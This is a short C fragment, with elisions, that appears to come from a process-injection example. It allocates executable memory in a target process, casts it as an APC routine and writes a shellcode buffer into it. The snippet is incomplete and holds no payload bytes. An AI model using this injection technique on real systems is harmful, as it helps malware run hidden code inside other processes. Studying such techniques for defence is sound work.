...
int main() {
	...
	cdwTrheads = GetThreadCount(dwPid);

	shellAddress = VirtualAllocEx(hProcess, NULL, cbShellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	WriteProcessMemory(hProcess, shellAddress, bBuf, cbShellSize, NULL);
